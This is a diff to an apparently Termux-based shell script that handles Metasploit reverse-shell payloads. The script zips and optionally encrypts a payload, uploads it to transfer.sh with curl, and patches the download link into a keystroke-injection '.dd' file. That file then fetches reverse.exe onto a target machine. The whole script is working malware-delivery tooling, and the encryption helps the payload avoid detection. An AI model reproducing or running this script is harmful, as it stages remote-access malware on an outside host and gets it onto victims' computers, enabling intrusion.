@@ -20,9 +20,11 @@ echo "::::Copying the payload in utiles/msf folder... :\n"
 cp ~/msf/temp/$FILE /storage/emulated/0/utiles/msf/
 ls /storage/emulated/0/utiles/msf/$FILE
 
+RANDOMLETTER=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 5)
 LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt
-TEMP="~/msf/temp"
-ENCRYPTEDFILE=~/msf/temp/$FILE.zip
+ARCHIVE="/data/data/com.termux/files/home/msf/temp/reverse-$RANDOMLETTER.zip"
+TEMP="/data/data/com.termux/files/home/msf/temp"
+ENCRYPTEDFILE="/data/data/com.termux/files/home/msf/temp/$FILE-encrypted.zip"
 DDFILE="/data/data/com.termux/files/home/msf/dd/payload_sample.dd"
 DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypted.dd"
 
@@ -30,7 +32,7 @@ DDFILEENCRYPTED="/data/data/com.termux/files/home/msf/dd/payload_sample_encrypte
 echo "\033[1;33m\n:::: CLEAR DO YOU WANT TO UPLOAD AND ENCRYPT YOUR PAYLOAD ON TRANSFER.SH? \n:::: Type "y" for UPLOAD, "yy" for UPLOAD & ENCRYPT\033[0m\033[1;32m(BETA openssl)\033[0m\033[1;33m, or press ENTER for none of that\n\033[0m"
 read UPLOAD_choice
 if [ $UPLOAD_choice = "yy" ]; then
-	zip -r -8 -e $ENCRYPTEDFILE . -i $FILE
+	zip -e $ENCRYPTEDFILE $TEMP/$FILE
 	curl --upload-file $ENCRYPTEDFILE https://transfer.sh/reverse.zip > $LINKFILE
 	echo "\033[1;32m:::: Uploading the file into transfer.sh ... \033[0m"
 	echo "\033[1;32m:::: Remember: To download the payload you need to use gpg in your command, like this: \$ openssl aes-256-cbc -d -pbkdf2 -in reverse.encrypted -out reverse.exe\033[0m"
@@ -43,24 +45,25 @@ if [ $UPLOAD_choice = "yy" ]; then
 fi
 if [ $UPLOAD_choice = "y" ]; then
 	echo "\033[1;42m:::: Uploading the file into transfer.sh ... \033[0m"
-	curl --upload-file ~/msf/temp/$FILE https://transfer.sh/reverse.exe > $LINKFILE
+	zip $ARCHIVE $TEMP/$FILE
+	curl --upload-file $ARCHIVE https://transfer.sh/reverse.zip > $LINKFILE
 	echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder\n:::: The direct https link to the payload will be in it\033[0m"
 	echo "\033[1;42m::::DONE\033[0m"
 	echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
 	echo "::::The .dd file is creating .."
 	rm /storage/emulated/0/utiles/payload.dd
-	echo "$(cat $DDFILE | sed "s#$(cat $DDFILE | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
+	echo "$(cat $DDFILEENCRYPTED | sed "s#$(cat $DDFILEENCRYPTED | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
 fi
 
 
 echo "\033[1;33m\n:::: If you have upload the payload check this:\n:::: If there is no new link, the upload failed \033[0m"
 echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
 echo "new link:\033[1;32m $(cat /storage/emulated/0/utiles/payload.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
-echo "$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > ~/msf/temp/old_link.txt
-echo "$(cat $LINKFILE)" > ~/msf/temp/new_link.txt
+echo "$(cat $DDFILE | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > $TEMP/old_link.txt
+echo "$(cat $LINKFILE)" > $TEMP/new_link.txt
 OLDLINK=$(cat ~/msf/temp/old_link.txt)
 NEWLINK=$(cat ~/msf/temp/new_link.txt)
-if [ "$OLDLINK" = "$NEWLINK" ]
+if [ "$OLDLINK" == "$NEWLINK" ]
 then
 	echo "\033[1;31m Failed to change the link in the .dd file \033[0m"
 else
